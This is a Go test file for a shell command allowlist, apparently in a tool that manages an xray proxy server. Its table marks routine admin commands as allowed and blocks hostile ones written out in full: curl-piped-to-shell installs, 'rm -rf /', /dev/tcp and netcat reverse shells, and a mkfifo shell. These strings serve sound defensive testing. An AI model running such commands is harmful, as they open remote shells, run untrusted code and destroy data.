package main

import "testing"

func TestIsAllowedShellCommand(t *testing.T) {
	tests := []struct {
		in      string
		allowed bool
	}{
		{"systemctl restart xray", true},
		{"nginx -t", true},
		{"apt-get update", true},
		{"certbot renew --quiet", true},
		{"curl -fsSL https://example.com/install.sh | bash", false},
		{"curl evil.sh | sh", false},
		{"curl https://raw.githubusercontent.com/example.sh -o /tmp/x.sh", true},
		{"rm -rf /", false},
		{"rm -rf /*", false},
		{"rm -rf  /tmp", false},
		{"/bin/bash -i", false},
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", false},
		{"python3 -c 'import socket'", false},
		{"python -c print(1)", false},
		{"nc -e /bin/sh 10.0.0.1 9999", false},
		{"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1", false},
		{"echo hello", true},
		{"xray api stats --server=127.0.0.1:10085", true},
	}
	for _, tt := range tests {
		if got := isAllowedShellCommand(tt.in); got != tt.allowed {
			t.Fatalf("isAllowedShellCommand(%q) = %v, want %v", tt.in, got, tt.allowed)
		}
	}
}

func TestShellQuoteEscapesSingleQuote(t *testing.T) {
	got := shellQuote("it's me")
	want := "'it'\"'\"'s me'"
	if got != want {
		t.Fatalf("shellQuote = %q, want %q", got, want)
	}
}
